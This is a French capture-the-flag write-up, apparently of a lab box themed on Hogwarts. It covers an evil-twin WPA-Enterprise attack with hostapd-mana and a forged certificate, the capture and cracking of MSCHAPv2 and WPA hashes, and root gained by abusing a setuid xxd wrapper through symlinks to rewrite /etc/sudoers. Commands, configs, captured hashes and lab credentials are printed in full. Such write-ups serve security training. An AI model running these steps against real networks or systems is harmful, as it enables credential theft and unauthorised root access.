 F0:9F:C2:71:22:15  -28      288        0    0  44   54e  WPA2 CCMP   MGT  wifi-college                                                                                                                          
 F0:9F:C2:71:22:17  -28      286        0    0  40   54e  WPA2 CCMP   MGT  wifi-college                                                                                                                          
 F0:9F:C2:71:22:16  -28      291       37    0  36   54e  WPA2 CCMP   MGT  wifi-college                                                                                                                          

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 F0:9F:C2:71:22:16  64:32:A8:07:6C:43  -29    0 -54e     0        9         wifi-college                                                                                                                          
 F0:9F:C2:71:22:16  64:32:A8:07:6C:41  -29    0 - 6      0        1         wifi-college                                                                                                                          
 F0:9F:C2:71:22:16  64:32:A8:07:6C:42  -29    6e-18e     0       33  PMKID  wifi-college                                                                                                                          
 F0:9F:C2:71:22:16  64:32:A8:07:6C:40  -29    0 -54e     0        9         wifi-college
```

À ce stade mon fichier MANA qui déclare l'AP ressemblait à ceci :

```
interface=wlan1
ssid=wifi-college
hw_mode=a
channel=36
bssid=F0:9F:C2:71:22:16

auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

mana_wpaout=/tmp/wifi-college.hcapx
```

J'ai extrait les handshakes de la capture `airodump` et j'ai tenté de les casser avec JtR. Ça n'a rien donné.

```console
$ ./wpapcap2john /tmp/capture-01.cap 
File capture-01.cap: raw 802.11
Dumping RSN IE PMKID at 63.614400 BSSID F0:9F:C2:71:22:16 ESSID 'wifi-college' STA 64:32:A8:07:6C:42
wifi-college:06d72e07760cad3f74d4403851aa63bf*f09fc2712216*6432a8076c42*776966692d636f6c6c656765:6432a8076c42:f09fc2712216:f09fc2712216::PMKID:capture-01.cap
Dumping M3/M2 at 63.615424 BSSID F0:9F:C2:71:22:16 ESSID 'wifi-college' STA 64:32:A8:07:6C:42
wifi-college:$WPAPSK$wifi-college#w7z0QG6KN18c/ql0JNMNaX56A7klEDMkC3OcLBmNZYMjSrhktzGg0hg.72OC6/V.9eMZH6aAqOERLPXEztmf1jIP4N7hoZxQ/FnBqU21.5I0.Ec............/JNMNaX56A7klEDMkC3OcLBmNZYMjSrhktzGg0hg.72M.................................................................3X.I.E..1uk2.E..1uk2.E..1uk/....................................................................................................................................................................................../t.....U...6jV7.I8QQm/WHEqm6vZlGM:6432a8076c42:f09fc2712216:f09fc2712216::WPA2, verified:capture-01.cap

3 ESSIDS processed and 1 AP/STA pairs processed
1 handshakes written, 1 RSN IE PMKIDs
```

De son côté Mana obtenait d'autres types de hashs (ce sont sensiblement les mêmes, mais plus rapides à casser) :

```console
$ sudo /usr/bin/hostapd-mana -i wlan1 /tmp/mana.conf
Configuration file: /tmp/mana.conf
MANA: Captured WPA/2 handshakes will be written to file '/tmp/wifi-college.hcapx'.
Using interface wlan1 with hwaddr f0:9f:c2:71:22:16 and ssid "wifi-college"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
wlan1: STA 64:32:a8:07:6c:40 IEEE 802.11: authenticated
wlan1: STA 64:32:a8:07:6c:40 IEEE 802.11: associated (aid 1)
MANA: Captured a WPA/2 handshake from: 64:32:a8:07:6c:40
MANA WPA2 HASHCAT | WPA*02*01724535a323a494d415ee58676a618b*f09fc2712216*6432a8076c40*776966692d636f6c6c656765*11caad069c619e5ad1b42c348347b97cf100490d26852b25d0ac70d85e7b0024*0103008702010a00000000000000000001d8461baee9ae51a81b0e4c72ed08563a86c7ad4ccbe81760c78e4ed72158564f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002830260100000fac040100000fac040100000fac01000001003134172b2be0fd6b9c092568488236ec*00
MANA: Captured a WPA/2 handshake from: 64:32:a8:07:6c:40
MANA WPA2 HASHCAT | WPA*02*a65ec8c6cf6d7755f4180a1863ec5a09*f09fc2712216*6432a8076c40*776966692d636f6c6c656765*11caad069c619e5ad1b42c348347b97cf100490d26852b25d0ac70d85e7b0024*0103005f02030a0000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*00
wlan1: STA 64:32:a8:07:6c:42 IEEE 802.11: authenticated
wlan1: STA 64:32:a8:07:6c:42 IEEE 802.11: associated (aid 2)
MANA: Captured a WPA/2 handshake from: 64:32:a8:07:6c:42
MANA WPA2 HASHCAT | WPA*02*5825ccc3e9dff77ea937c0c1a881bffc*f09fc2712216*6432a8076c42*776966692d636f6c6c656765*70362926eac4bc78e30f3384a9252a5e000cac4fdf866a04f0b2d7d71973fac4*0103008702010a00000000000000000001b542f98519003ee42503510ab1442a098b8d81cedff58f15eb0fa45eddd3c279000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002830260100000fac040100000fac040100000fac01000001009647e3aa85be1ef075a8e4a4b2858232*00
MANA: Captured a WPA/2 handshake from: 64:32:a8:07:6c:42
MANA WPA2 HASHCAT | WPA*02*05de23dc131f647c5c1942089b7c6398*f09fc2712216*6432a8076c42*776966692d636f6c6c656765*70362926eac4bc78e30f3384a9252a5e000cac4fdf866a04f0b2d7d71973fac4*0103005f02030a0000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*00
wlan1: STA 64:32:a8:07:6c:43 IEEE 802.11: authenticated
wlan1: STA 64:32:a8:07:6c:43 IEEE 802.11: associated (aid 3)
MANA: Captured a WPA/2 handshake from: 64:32:a8:07:6c:43
MANA WPA2 HASHCAT | WPA*02*ef54d9dc7c1788907f4ab912a6ec238d*f09fc2712216*6432a8076c43*776966692d636f6c6c656765*2c8db55327f9e4ef0fffcb1f3b67c36c7cb81b8952564603afe34e9978207590*0103007502010a000000000000000000016d52b38bb0fe07e590c7006d68f342da4bde1187ea688b12d51ccd6615424342000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac010000*00
MANA: Captured a WPA/2 handshake from: 64:32:a8:07:6c:43
MANA WPA2 HASHCAT | WPA*02*98a47d6d855ed2db37d4303d498ed0f7*f09fc2712216*6432a8076c43*776966692d636f6c6c656765*2c8db55327f9e4ef0fffcb1f3b67c36c7cb81b8952564603afe34e9978207590*0103005f02030a0000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*00
wlan1: STA 64:32:a8:07:6c:41 IEEE 802.11: authenticated
wlan1: STA 64:32:a8:07:6c:41 IEEE 802.11: associated (aid 4)
MANA: Captured a WPA/2 handshake from: 64:32:a8:07:6c:41
MANA WPA2 HASHCAT | WPA*02*090496b1e0b2ba916ab503e80793da29*f09fc2712216*6432a8076c41*776966692d636f6c6c656765*59a383bb925de9a503b8e5e2d1bfcc7c883a675218cf193f31602c8d01954ad7*0103008702010a0000000000000000000117098999045fa89803a18e6c0521d34fd96297b23769fe09157405788cb5bb5f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002830260100000fac040100000fac040100000fac010000010023a197b77cbde9aa2d0869186b513bd7*00
MANA: Captured a WPA/2 handshake from: 64:32:a8:07:6c:41
MANA WPA2 HASHCAT | WPA*02*291da26afa15cd01f44babfcd70b599b*f09fc2712216*6432a8076c41*776966692d636f6c6c656765*59a383bb925de9a503b8e5e2d1bfcc7c883a675218cf193f31602c8d01954ad7*0103005f02030a0000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*00
wlan1: STA 64:32:a8:07:6c:41 IEEE 802.11: authenticated
wlan1: STA 64:32:a8:07:6c:41 IEEE 802.11: associated (aid 4)
MANA: Captured a WPA/2 handshake from: 64:32:a8:07:6c:41
MANA WPA2 HASHCAT | WPA*02*e448bebd4a251c90fc2ea71b6a29638b*f09fc2712216*6432a8076c41*776966692d636f6c6c656765*83070de6bd9e4f3b92f6e4159f9e95918a5a8fe3cd81f4f01ca04be02de3c493*0103007502010a00000000000000000001e746a1c7989dd48dec8255335443bd795f9a26183e094829228759644de61019000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac010000*00
```

Sans surprise, une attaque par force brute n'a rien trouvé.

### Petrificus Totalus

En regardant les échanges dans la capture réseau, j'ai relevé des handshakes TLS qui semblaient réussir.

Je ne suis pas expert WiFI mais voici l'explication :

Le standard 802.1X repose sur EAP (Extensible Authentication Protocol) dans lequel le client doit prouver son identité auprès d'un serveur d'authentification comme [Radius](https://fr.wikipedia.org/wiki/Remote_Authentication_Dial-In_User_Service).

L'AP transmet la requête d'authentification au Radius qui retourne un certificat que le client doit utiliser pour établir un tunnel sécurisé (comme une connexion sur un site sécurisé en fait).

Une fois le tunnel établi, le client envoi ses identifiants à travers ce tunnel, soit en clair, soit sous la forme d'un hash. Tout dépend du type d'EAP (je suppose que client et serveur se mettent d'accord sur le type utilisé dans le handshake).

L'idée de l'attaque ici est d'usurper le certificat fournit par l'AP légitime. C'est un procédé expliqué sur ces deux sites :

[Attacking WPA Enterprise | Shuciran Pentesting Notes](https://shuciran.github.io/posts/Attacking-WPA-Enterprise/)

[Evil Twin Enterprise WiFi Network using Hostapd-Mana](https://tbhaxor.com/evil-twin-wifi-network-using-hostapd-mana/)

J'ai commencé par extraire le certificat depuis Wireshark vers un fichier DER. Voici les infos du certificat en question :

```console
$ openssl x509 -inform der -in certif1.der -text | grep -E "(Subject|Issuer):"
        Issuer: C=ES, ST=Madrid, L=Madrid, O=Hogwarts, OU=Hogwarts College, CN=Hogwarts Certificate Authority, emailAddress=ca@hogwarts.htb
        Subject: C=ES, ST=Madrid, L=Madrid, O=Hogwarts, OU=Hogwarts College, CN=Hogwarts Certificate Authority, emailAddress=server@hogwarts.htb
```

Ce certificat est auto-signé, car l’`Issuer` et le `Subject` sont identiques :  **CN = Hogwarts Certificate Authority**.

On n'a pas besoin du DER pour la suite, car il ne contient que la clé publique, on ne peut donc pas l'utiliser pour du MITM.

Petit coup d'aide de ChatGPT pour mettre en place le faux certificat :

------------------------------

### 🛠 Étapes : forger un certificat avec CN identique

```bash
mkdir rogue-cert && cd rogue-cert
```

#### 1. Générer la clé CA

```bash
openssl genrsa -out ca.key 2048
```

#### 2. Générer un certificat auto-signé pour la CA

```bash
openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out ca.pem \
  -subj "/C=ES/ST=Madrid/L=Madrid/O=Hogwarts/OU=Hogwarts College/CN=Hogwarts Certificate Authority/emailAddress=ca@hogwarts.htb"
```

#### 3. Générer la clé du serveur RADIUS

```bash
openssl genrsa -out server.key 2048
```

#### 4. Générer la requête de certificat (CSR)

```bash
openssl req -new -key server.key -out server.csr \
  -subj "/C=ES/ST=Madrid/L=Madrid/O=Hogwarts/OU=Hogwarts College/CN=Hogwarts Certificate Authority/emailAddress=server@hogwarts.htb"
```

#### 5. Signer le CSR avec notre CA

```bash
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial \
  -out server.pem -days 500 -sha256
```

--------------------------------

On avait aussi besoin de créer une clé [Diffie–Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) :

```bash
openssl dhparam -out dh.pem 2048
```

Après pas mal d'essais, j'avais ce fichier de configuration :

```toml
# common hostapd configuration
interface=wlan1
ssid=wifi-college
hw_mode=a
channel=36
bssid=F0:9F:C2:71:22:16

# WPA configuration
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP

# EAP TLS MitM
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=hostapd.eap_user

# certificate configuration for EAP-TLS/PEAP/TTLS
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
private_key_passwd=
dh_file=dh.pem

# mana specific configuration
mana_wpe=1
mana_eaptls=1
mana_eapsuccess=1
mana_credout=/tmp/hostapd.credout
```

Et j'ai pu obtenir des hashs EAP-MSCHAPV2 :

```
MANA EAP Identity Phase 1: Hogwarts\rubeus.hagrid
MANA EAP EAP-MSCHAPV2 ASLEAP user=rubeus.hagrid | asleap -C 68:10:f2:09:ed:f0:8d:df -R 6a:07:7a:f6:7c:c2:06:1c:25:96:b8:4a:ef:f0:1f:3d:ce:53:f5:c6:77:4d:fe:3e
MANA EAP EAP-MSCHAPV2 JTR | rubeus.hagrid:$NETNTLM$6810f209edf08ddf$6a077af67cc2061c2596b84aeff01f3dce53f5c6774dfe3e:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | rubeus.hagrid::::6a077af67cc2061c2596b84aeff01f3dce53f5c6774dfe3e:6810f209edf08ddf
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): b5 39 8b 02 1c a5 f4 42 69 cb 37 f4 1f b4 d9 51

MANA EAP Identity Phase 1: Hogwarts\albus.dumbledore
MANA EAP EAP-MSCHAPV2 ASLEAP user=albus.dumbledore | asleap -C 59:6b:b2:63:ee:64:61:01 -R 4c:ba:18:f1:88:85:5e:8e:5b:9f:20:b0:45:a4:f8:c9:a9:d1:f6:33:30:dd:4d:2c
MANA EAP EAP-MSCHAPV2 JTR | albus.dumbledore:$NETNTLM$596bb263ee646101$4cba18f188855e8e5b9f20b045a4f8c9a9d1f63330dd4d2c:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | albus.dumbledore::::4cba18f188855e8e5b9f20b045a4f8c9a9d1f63330dd4d2c:596bb263ee646101
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): 43 ff 5a 4c 38 dd e6 a9 0f 47 dd 0f ce 21 68 cf

MANA EAP Identity Phase 1: Hogwarts\minerva.mcgonagall
MANA EAP EAP-MSCHAPV2 ASLEAP user=minerva.mcgonagall | asleap -C 57:b4:c0:6e:76:fd:fb:15 -R ff:bd:12:99:c5:bb:aa:43:33:ec:34:e8:7e:1d:d5:3e:7d:db:47:9c:70:e9:a5:ff
MANA EAP EAP-MSCHAPV2 JTR | minerva.mcgonagall:$NETNTLM$57b4c06e76fdfb15$ffbd1299c5bbaa4333ec34e87e1dd53e7ddb479c70e9a5ff:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | minerva.mcgonagall::::ffbd1299c5bbaa4333ec34e87e1dd53e7ddb479c70e9a5ff:57b4c06e76fdfb15
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): 52 fe f2 82 7a 62 53 33 3a fb fe f4 df de db 52

MANA EAP Identity Phase 1: Hogwarts\tom.riddle
MANA EAP EAP-MSCHAPV2 ASLEAP user=tom.riddle | asleap -C 2a:93:09:09:97:af:ab:33 -R d8:04:58:4e:71:03:9d:92:8a:5e:b5:de:8f:54:5e:21:fb:24:29:b3:40:63:6a:dd
MANA EAP EAP-MSCHAPV2 JTR | tom.riddle:$NETNTLM$2a93090997afab33$d804584e71039d928a5eb5de8f545e21fb2429b340636add:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | tom.riddle::::d804584e71039d928a5eb5de8f545e21fb2429b340636add:2a93090997afab33
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): a7 9d 8e 20 65 18 bf 0d 67 9f 72 39 55 4f 24 b6
```

Ils sont rapides à brute-forcer, mais un seul est tombé :

`blackhogwarts     (tom.riddle)`

### Alohomora

On revient à cette histoire de Horcrux :

```console
tom.riddle@MagiFi:~$ ls -alh
total 44K
drwxr-xr-x 3 tom.riddle tom.riddle 4.0K Feb  4 09:57 .
drwxr-xr-x 7 root       root       4.0K Sep 27  2024 ..
lrwxrwxrwx 1 root       root          9 Sep 27  2024 .bash_history -> /dev/null
-rw-r--r-- 1 tom.riddle tom.riddle  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 tom.riddle tom.riddle 3.7K Feb 25  2020 .bashrc
drwx------ 2 tom.riddle tom.riddle 4.0K Feb  4 09:57 .cache
-rwsr-x--x 1 root       tom.riddle  17K May 14 16:57 .horcrux.png
-rw-r--r-- 1 tom.riddle tom.riddle  807 Feb 25  2020 .profile
tom.riddle@MagiFi:~$ file .horcrux.png 
.horcrux.png: setuid data
tom.riddle@MagiFi:~$ hexdump -C -n 32 .horcrux.png
00000000  89 50 4e 47 02 01 01 00  00 00 00 00 00 00 00 00  |.PNG............|
00000010  03 00 3e 00 01 00 00 00  a0 11 00 00 00 00 00 00  |..>.............|
00000020
```

Ce dernier étant bien une image, on s'oriente vers le binaire croisé plus tôt :

```console
tom.riddle@MagiFi:~$ /usr/bin/xxd_horcrux
Usage:
       xxd [options] [infile [outfile]]
    or
       xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]]
Options:
    -a          toggle autoskip: A single '*' replaces nul-lines. Default off.
    -b          binary digit dump (incompatible with -ps,-i,-r). Default hex.
    -C          capitalize variable names in C include file style (-i).
    -c cols     format <cols> octets per line. Default 16 (-i: 12, -ps: 30).
    -E          show characters in EBCDIC. Default ASCII.
    -e          little-endian dump (incompatible with -ps,-i,-r).
    -g          number of octets per group in normal output. Default 2 (-e: 4).
    -h          print this summary.
    -i          output in C include file style.
    -l len      stop after <len> octets.
    -o off      add <off> to the displayed file position.
    -ps         output in postscript plain hexdump style.
    -r          reverse operation: convert (or patch) hexdump into binary.
    -r -s off   revert with <off> added to file positions found in hexdump.
    -s [+][-]seek  start at <seek> bytes abs. (or +: rel.) infile offset.
    -u          use upper case hex letters.
    -v          show version: "xxd V1.10 27oct98 by Juergen Weigert".
    -O <file>   specify output file (only horcruxes are allowed).
```

On essaye quelques commandes pour voir comment ça marche :

```console
tom.riddle@MagiFi:~$ /usr/bin/xxd_horcrux abc def
Error: Output file can't be empty, use the -O option.
tom.riddle@MagiFi:~$ /usr/bin/xxd_horcrux abc def -O ghi
Not every wizards can use or destroy a Horcrux!
```

On a la chance d'avoir `ltrace` sur le système :

```console
tom.riddle@MagiFi:~$ ltrace /usr/bin/xxd_horcrux abc def -O ghi
getuid()                                                                                                                          = 1004
getpwuid(1004, 0x7ffe6fe09888, 0x7ffe6fe098b8, 0x7fbfa2ed10eb)                                                                    = 0x7fbfa2fdc4a0
strcmp("tom.riddle", "tom.riddle")                                                                                                = 0
strcmp("abc", "-h")                                                                                                               = 52
strcmp("abc", "--help")                                                                                                           = 52
strcmp("abc", "-O")                                                                                                               = 52
strncmp("abc", "/root/", 6)                                                                                                       = 50
strncmp("abc", "/etc/", 5)                                                                                                        = 50
strcmp("def", "-O")                                                                                                               = 55
strncmp("def", "/root/", 6)                                                                                                       = 53
strncmp("def", "/etc/", 5)                                                                                                        = 53
strcmp("-O", "-O")                                                                                                                = 0
strcmp("ghi", ".horcrux.png")                                                                                                     = 57
fwrite("Not every wizards can use or des"..., 1, 48, 0x7fbfa2fda5c0Not every wizards can use or destroy a Horcrux!
)                                                              = 48
+++ exited (status 1) +++
```

On voit ici que :

- le path d'input ne doit pas contenir `/root/`  ou `/etc/`

- le path d'output ne doit pas contenir `/root/` ou `/etc/`

- le fichier passé avec `-O` doit se nommer `.horcrux.png`

Comme on s'y attend, le programme appelle le vrai `xxd` mais via `execve` ce qui rend impossible une injection via la variable `PATH` :

```console
tom.riddle@MagiFi:~$ echo "hello there" > abc
tom.riddle@MagiFi:~$ /usr/bin/xxd_horcrux abc def -O .horcrux.png
tom.riddle@MagiFi:~$ ls -al abc def
-rw-rw-r-- 1 tom.riddle tom.riddle 12 May 14 17:02 abc
-rw-rw-r-- 1 root       tom.riddle 64 May 14 17:02 def
tom.riddle@MagiFi:~$ cat def
00000000: 6865 6c6c 6f20 7468 6572 650a            hello there.
```

Avec le programme, on peut donc lire un fichier. On obtiendra sa version hexa.

Pour bypasser le check sur `/etc` je peux simplement utiliser un lien symbolique. Ici, je vais obtenir le contenu de `/etc/sudoers`.

```console
tom.riddle@MagiFi:/tmp$ mkdir yolo
tom.riddle@MagiFi:/tmp$ cd yolo/
tom.riddle@MagiFi:/tmp/yolo$ ln -s /etc/sudoers sudoers
tom.riddle@MagiFi:/tmp/yolo$ /usr/bin/xxd_horcrux sudoers out -O .horcrux.png
tom.riddle@MagiFi:/tmp/yolo$ ls -al
total 12
drwxrwxr-x  2 tom.riddle tom.riddle 4096 May 13 22:15 .
drwxrwxrwt 14 root       root       4096 May 13 22:15 ..
-rw-------  1 root       tom.riddle    0 May 13 22:15 .horcrux.png
-rw-rw-r--  1 root       tom.riddle 3864 May 13 22:15 out
lrwxrwxrwx  1 tom.riddle tom.riddle   12 May 13 22:15 sudoers -> /etc/sudoers
tom.riddle@MagiFi:/tmp/yolo$ xxd -r out 
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL
harry_potter    ALL=(root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
```

Maintenant, on va utiliser le programme pour réécrire `/etc/sudoers`. Il faut utiliser l'option `-r` qui va transformer le dump hexa vers sa version brute.

Bien sûr, j'ajoute une ligne pour obtenir un accès root :

```console
tom.riddle@MagiFi:/tmp/yolo$ xxd -r out > sudoers
tom.riddle@MagiFi:/tmp/yolo$ echo -e "tom.riddle ALL=(ALL) NOPASSWD: /bin/sh\n#" >> sudoers
tom.riddle@MagiFi:/tmp/yolo$ xxd sudoers > reversed
tom.riddle@MagiFi:/tmp/yolo$ ln -s /etc/sudoers real_sudoers
tom.riddle@MagiFi:/tmp/yolo$ /usr/bin/xxd_horcrux -r reversed real_sudoers -O .horcrux.png
tom.riddle@MagiFi:/tmp/yolo$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root_flag_as5df.txt  snap  Sources  Wifi_Docker
# cat root_flag_as5df.txt
hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}
```

### Revelio

La partie WiFi du challenge est complexe avec des nombreux scripts bashs et fichiers de configuration.

La base est le script `start_containers.sh` qui lance deux containers docker :

```bash
#!/bin/bash

modprobe mac80211_hwsim radios=10

docker run --detach --name aps --rm -it --privileged -v /lib/modules:/lib/modules --net host wifi_aps
docker run --detach --name clients --rm -it --privileged -v /lib/modules:/lib/modules --net host wifi_clients
```

Pour la partie AP voici la configuration EAP légitime :

```console
root@MagiFi:~/Wifi_Docker/APs/config# cat mgt/hostapd_wpe.eap_user 
# WPE - DO NOT REMOVE - These entries are specifically in here 
*               PEAP,TTLS,TLS,FAST
#"t"        TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2  "t"     [2]

*       PEAP,TTLS,TLS,FAST [ver=1]
#"t"    GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "password" [2]

"Hogwarts\rubeus.hagrid"                        MSCHAPV2                "8c6ce3a96e534a2538fcd28d40bac215" [2]
"Hogwarts\albus.dumbledore"                     MSCHAPV2                "08a22c9aecad00dad47d48184b8319ad" [2]
"Hogwarts\minerva.mcgonagall"           MSCHAPV2                "39a350b6b54db0f65937e1f31b1712b6" [2]
"Hogwarts\tom.riddle"                   MSCHAPV2                "blackhogwarts" [2]
```

Du côté des clients, on trouve ce script `startClients.sh` :

```bash
#!/bin/bash -x

envsubst_tmp (){
    for F in ./*.tmp ; do
        echo $F
        NEW=`basename $F .tmp`
        envsubst < $F > $NEW
        rm $F
    done
}

function retry { 
    $1 && echo "success" || (echo "fail" && retry $1) 
}

date

echo 'nameserver 8.8.8.8' > /etc/resolv.conf

#LOAD VARIABLES FROM FILE (EXPORT)
set -a
source /root/wlan_config_clients

mkdir -p /root/logs/
macchanger -m $MAC_MGT_MSCHAP $WLAN_MGT_MSCHAP > /root/logs/macchanger.log
macchanger -m $MAC_MGT_MSCHAP1 $WLAN_MGT_MSCHAP1 >> /root/logs/macchanger.log
macchanger -m $MAC_MGT_MSCHAP2 $WLAN_MGT_MSCHAP2 >> /root/logs/macchanger.log
macchanger -m $MAC_MGT_MSCHAP3 $WLAN_MGT_MSCHAP3 >> /root/logs/macchanger.log

sleep 5

# Exec cronClient
bash /root/cronClients.sh > /root/logs/cronClients.log &

# MGT .5
while :
do
    TIMEOUT=$(( ( RANDOM % 120 )  + 60 ))
    sudo timeout -k 1s ${TIMEOUT}s wpa_wifi_supplicant -Dnl80211 -i$WLAN_MGT_MSCHAP -c /root/mgtClient/wpa_mschapv2.conf >> /root/logs/supplicantMSCHAP.log &
    wait $!
done &

while :
do
    TIMEOUT=$(( ( RANDOM % 120 )  + 60 ))
    sudo timeout -k 1s ${TIMEOUT}s wpa_wifi_supplicant -Dnl80211 -i$WLAN_MGT_MSCHAP1 -c /root/mgtClient/wpa_mschapv21.conf  >> /root/logs/supplicantGTC.log &
    wait $!
done &

while :
do
    TIMEOUT=$(( ( RANDOM % 120 )  + 60 ))
    sudo timeout -k 1s ${TIMEOUT}s wpa_wifi_supplicant -Dnl80211 -i$WLAN_MGT_MSCHAP2 -c /root/mgtClient/wpa_mschapv22.conf  >> /root/logs/supplicantGTC.log &
    wait $!
done &

while :
do
    TIMEOUT=$(( ( RANDOM % 120 )  + 60 ))
    sudo timeout -k 1s ${TIMEOUT}s wpa_wifi_supplicant -Dnl80211 -i$WLAN_MGT_MSCHAP3 -c /root/mgtClient/wpa_mschapv23.conf  >> /root/logs/supplicantGTC.log &
    wait $!
done &

# Wait for this ID at the end
LAST=$!

sleep 10 && echo "ALL SET"

/bin/bash

wait $LAST
```

C'est celui qui lance les connexions aux réseaux WiFi.

Les identifiants sont dans des fichiers de ce type :

```python
ctrl_interface=/var/run/wpa_supplicant 
  
network={
    ssid="wifi-college"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="Hogwarts\tom.riddle"
    password="blackhogwarts"
    phase1="peapver=1"
    phase2="auth=MSCHAPV2"
}
```

Un très bon challenge que l'auteur a du mettre du temps à créer, merci à lui !
